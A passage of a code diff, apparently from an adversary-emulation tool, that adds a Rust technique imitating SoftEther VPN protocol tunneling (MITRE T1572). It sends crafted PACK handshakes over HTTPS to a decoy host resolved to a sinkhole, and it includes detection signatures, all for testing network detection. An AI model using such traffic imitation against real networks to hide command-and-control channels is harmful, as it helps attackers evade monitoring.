+// requests total, matching the SharePoint exfil baseline (~10 requests).
+
+// SoftEther PACK type codes (src/Mayaqua/Pack.c)
+const SE_INT:  u8 = 0;
+const SE_DATA: u8 = 1;
+const SE_STR:  u8 = 2;
+
+fn se_elem_int(name: &str, value: u32) -> Vec<u8> {
+    let n = name.as_bytes();
+    let mut v = vec![SE_INT];
+    v.extend_from_slice(&(n.len() as u32).to_be_bytes());
+    v.extend_from_slice(n);
+    v.extend_from_slice(&1u32.to_be_bytes()); // value_count = 1
+    v.extend_from_slice(&value.to_be_bytes());
+    v
+}
+
+fn se_elem_str(name: &str, value: &str) -> Vec<u8> {
+    let n = name.as_bytes();
+    let s = value.as_bytes();
+    let mut v = vec![SE_STR];
+    v.extend_from_slice(&(n.len() as u32).to_be_bytes());
+    v.extend_from_slice(n);
+    v.extend_from_slice(&1u32.to_be_bytes());
+    v.extend_from_slice(&(s.len() as u32).to_be_bytes());
+    v.extend_from_slice(s);
+    v
+}
+
+fn se_elem_data(name: &str, value: &[u8]) -> Vec<u8> {
+    let n = name.as_bytes();
+    let mut v = vec![SE_DATA];
+    v.extend_from_slice(&(n.len() as u32).to_be_bytes());
+    v.extend_from_slice(n);
+    v.extend_from_slice(&1u32.to_be_bytes());
+    v.extend_from_slice(&(value.len() as u32).to_be_bytes());
+    v.extend_from_slice(value);
+    v
+}
+
+fn se_pack(elements: &[Vec<u8>]) -> Vec<u8> {
+    let mut out = (elements.len() as u32).to_be_bytes().to_vec();
+    for e in elements {
+        out.extend_from_slice(e);
+    }
+    out
+}
+
+// SoftEther HTTP headers — User-Agent verbatim from src/Cedar/Http.c
+const SE_UA: &str = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; \
+                     .NET CLR 1.1.4322; .NET CLR 2.0.50727)";
+const SE_HOST: &str = "signalbench-vpn.cn";
+const SE_PORT: u16 = 992;
+const SE_PATH: &str = "/vpnsvc/connect.cgi";
+const SE_SESSIONS: u32 = 3; // sessions per run (3 × 3 = 9 requests ≈ SharePoint 10)
+
+/// Run one SoftEther VPN session: hello → login → getconfig (3 HTTPS POSTs).
+/// Returns the number of successful exchanges.
+async fn softether_vpn_session(
+    client: &reqwest::Client,
+    session_num: u32,
+    log: &mut File,
+    timeout_secs: u32,
+) -> u32 {
+    let client_id: u32 = rand::random();
+    let client_random: Vec<u8> = (0..20).map(|_| rand::random::<u8>()).collect();
+
+    let rounds: &[(&str, Vec<u8>)] = &[
+        (
+            "hello",
+            se_pack(&[
+                se_elem_str("method", "hello"),
+                se_elem_int("client_ver", 0x0002_0064),
+                se_elem_int("client_build", 9737),
+                se_elem_str("client_str", "SoftEther VPN Client"),
+                se_elem_int("client_id", client_id),
+                se_elem_data("random", &client_random),
+            ]),
+        ),
+        (
+            "login",
+            se_pack(&[
+                se_elem_str("method", "login"),
+                se_elem_str("hub", "VPN"),
+                se_elem_str("username", "vpn"),
+                se_elem_str("client_auth_method", "anonymous"),
+            ]),
+        ),
+        (
+            "getconfig",
+            se_pack(&[se_elem_str("method", "getconfig")]),
+        ),
+    ];
+
+    let url = format!("https://{}:{}{}", SE_HOST, SE_PORT, SE_PATH);
+    let mut ok = 0u32;
+
+    for (round_name, body) in rounds {
+        writeln!(
+            log,
+            "\n[session {session_num}] POST {SE_PATH} method={round_name} body={} bytes",
+            body.len()
+        )
+        .unwrap();
+
+        match tokio::time::timeout(
+            Duration::from_secs(u64::from(timeout_secs) + 2),
+            client
+                .post(&url)
+                .header("Content-Type", "application/octet-stream")
+                .header("Accept", "application/octet-stream")
+                .header("Accept-Encoding", "identity")
+                .header("Cache-Control", "no-cache")
+                .header("Pragma", "no-cache")
+                .header("Keep-Alive", "timeout=15, max=19")
+                .header("Connection", "Keep-Alive")
+                .header("User-Agent", SE_UA)
+                .header("Host", SE_HOST)
+                .body(body.clone())
+                .send(),
+        )
+        .await
+        {
+            Ok(Ok(resp)) => {
+                let status = resp.status();
+                writeln!(log, "  -> HTTP {status}").unwrap();
+                info!(
+                    "[T1572-SOFTETHER] session {session_num} {round_name} -> HTTP {status}"
+                );
+                ok += 1;
+            }
+            Ok(Err(e)) => {
+                writeln!(log, "  -> ERROR: {e}").unwrap();
+                warn!("[T1572-SOFTETHER] session {session_num} {round_name} error: {e}");
+            }
+            Err(_) => {
+                writeln!(log, "  -> TIMEOUT").unwrap();
+                warn!(
+                    "[T1572-SOFTETHER] session {session_num} {round_name} timed out after {}s",
+                    timeout_secs + 2
+                );
+            }
+        }
+    }
+    ok
+}
+
+pub struct SuspiciousDomainsSoftEther {}
+
+#[async_trait]
+impl AttackTechnique for SuspiciousDomainsSoftEther {
+    fn info(&self) -> Technique {
+        Technique {
+            id: "T1572-SOFTETHER".to_string(),
+            name: "Protocol Tunneling - SoftEther / PacketiX VPN Simulation".to_string(),
+            description: format!(
+                "Simulates {SE_SESSIONS} SoftEther VPN (PacketiX VPN) sessions over HTTPS on port \
+                 {SE_PORT}, each comprising a three-round binary PACK handshake (hello → login → \
+                 getconfig) against the sinkhole at {SE_HOST}:{SE_PORT}. \
+                 Total: {} HTTPS POST requests (~{}x SharePoint exfil volume). \
+                 PA-440 App-ID classifies the bidirectional TLS + HTTP-PACK flow as \
+                 'softether-vpn' / 'PacketiX VPN'. MITRE T1572 — Protocol Tunneling. \
+                 Reference: Unit42 CL-STA-1062 / TinyRCT backdoor; \
+                 SoftEther src/Cedar/Http.c + src/Mayaqua/Pack.c.",
+                SE_SESSIONS * 3,
+                SE_SESSIONS * 3 / 10 + if !(SE_SESSIONS * 3).is_multiple_of(10) { 1 } else { 0 }
+            ),
+            category: "COMMAND_AND_CONTROL".to_string(),
+            parameters: vec![
+                TechniqueParameter {
+                    name: "log_file".to_string(),
+                    description: "Path to save connection log".to_string(),
+                    required: false,
+                    default: Some("/tmp/signalbench_t1572_softether.log".to_string()),
+                },
+                TechniqueParameter {
+                    name: "timeout".to_string(),
+                    description: "Per-request timeout in seconds".to_string(),
+                    required: false,
+                    default: Some("5".to_string()),
+                },
+            ],
+            detection: format!(
+                "PA-440 App-ID: 'softether-vpn' / 'PacketiX VPN' on port {SE_PORT}. \
+                 IDS: HTTPS POST to /vpnsvc/connect.cgi with 4-byte BE element-count prefix \
+                 in the body (SoftEther PACK format). \
+                 Behavioural: repeated HTTPS connections to port {SE_PORT} from a non-VPN process."
+            ),
+            cleanup_support: true,
+            platforms: vec!["Linux".to_string()],
+            permissions: vec!["user".to_string()],
+            voltron_only: false,
+        }
+    }
+
+    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
+        Box::pin(async move {
+            let log_file = config
+                .parameters
+                .get("log_file")
+                .cloned()
+                .unwrap_or_else(|| "/tmp/signalbench_t1572_softether.log".to_string());
+            let timeout = config
+                .parameters
+                .get("timeout")
+                .and_then(|t| t.parse::<u32>().ok())
+                .unwrap_or(5);
+
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+
+            if dry_run {
+                info!(
+                    "[DRY RUN] T1572-SOFTETHER: Would run {SE_SESSIONS} SoftEther VPN sessions \
+                     to {SE_HOST}:{SE_PORT} (sinkhole {sinkhole_ip}) — {} HTTPS POST requests",
+                    SE_SESSIONS * 3
+                );
+                return Ok(SimulationResult {
+                    technique_id: "T1572-SOFTETHER".to_string(),
+                    success: true,
+                    message: format!(
+                        "DRY RUN: Would send {} HTTPS POSTs to {SE_HOST}:{SE_PORT} \
+                         ({SE_SESSIONS} SoftEther sessions, sinkhole {sinkhole_ip})",
+                        SE_SESSIONS * 3
+                    ),
+                    artifacts: vec![log_file],
+                    cleanup_required: false,
+                });
+            }
+
+            let sinkhole_addr: std::net::SocketAddr =
+                format!("{sinkhole_ip}:{SE_PORT}").parse().map_err(|e| {
+                    format!("Failed to parse sinkhole address {sinkhole_ip}:{SE_PORT}: {e}")
+                })?;
+
+            let client = reqwest::Client::builder()
+                .danger_accept_invalid_certs(true)
+                .resolve(SE_HOST, sinkhole_addr)
+                .timeout(Duration::from_secs(u64::from(timeout) + 2))
+                .build()
+                .map_err(|e| format!("Failed to build HTTP client: {e}"))?;
+
+            let mut log = File::create(&log_file)
+                .map_err(|e| format!("Failed to create log file: {e}"))?;
+            writeln!(log, "# SignalBench T1572-SOFTETHER - SoftEther VPN Protocol Tunneling").unwrap();
+            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
+            writeln!(log, "# Sinkhole:  {sinkhole_ip} (resolved from sinkhole.signalbench.sigre.xyz)").unwrap();
+            writeln!(log, "# Target:    https://{SE_HOST}:{SE_PORT}{SE_PATH}").unwrap();
+            writeln!(log, "# Sessions:  {SE_SESSIONS} x 3 rounds = {} HTTPS POST requests", SE_SESSIONS * 3).unwrap();
+            writeln!(log, "# --------------------------------------------------------\n").unwrap();
+
+            println!("\n[T1572-SOFTETHER] SoftEther / PacketiX VPN Protocol Tunneling");
+            println!("{}", "-".repeat(60));
+            println!(
+                "  Target:   https://{SE_HOST}:{SE_PORT}{SE_PATH}"
+            );
+            println!("  Sinkhole: {sinkhole_ip}");
+            println!(
+                "  Sessions: {SE_SESSIONS} × (hello + login + getconfig) = {} HTTPS POSTs",
+                SE_SESSIONS * 3
+            );
+            println!("{}", "-".repeat(60));
+
+            let mut total_ok = 0u32;
+            for s in 1..=SE_SESSIONS {
+                print!("  Session {s}/{SE_SESSIONS}  (hello/login/getconfig) ... ");
+                std::io::stdout().flush().ok();
+                let ok = softether_vpn_session(&client, s, &mut log, timeout).await;
+                total_ok += ok;
+                println!("{ok}/3 ok");
+                writeln!(log, "[session {s}] result: {ok}/3 exchanges ok").unwrap();
+                if s < SE_SESSIONS {
+                    sleep(Duration::from_millis(200)).await;
+                }
+            }
+
+            println!("{}", "-".repeat(60));
+            println!(
+                "  Total: {total_ok}/{} exchanges ok",
+                SE_SESSIONS * 3
+            );
+            info!(
+                "[T1572-SOFTETHER] Complete: {total_ok}/{} exchanges to {SE_HOST}:{SE_PORT}",
+                SE_SESSIONS * 3
+            );
+
+            Ok(SimulationResult {
+                technique_id: "T1572-SOFTETHER".to_string(),
+                success: true,
+                message: format!(
+                    "SoftEther VPN simulation: {total_ok}/{} HTTPS POSTs to \
+                     https://{SE_HOST}:{SE_PORT}{SE_PATH} (sinkhole {sinkhole_ip})",
+                    SE_SESSIONS * 3
+                ),
+                artifacts: vec![log_file],
+                cleanup_required: true,
+            })
+        })
+    }
+
+    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
+        Box::pin(async move {
+            for artifact in artifacts {
+                if Path::new(artifact).exists() {
+                    if let Err(e) = fs::remove_file(artifact) {
+                        warn!("[T1572-SOFTETHER] Failed to remove {artifact}: {e}");
+                    } else {
+                        debug!("[T1572-SOFTETHER] Removed: {artifact}");
+                    }
+                }
+            }
+            info!("[T1572-SOFTETHER] Cleanup complete");
             Ok(())
         })
     }
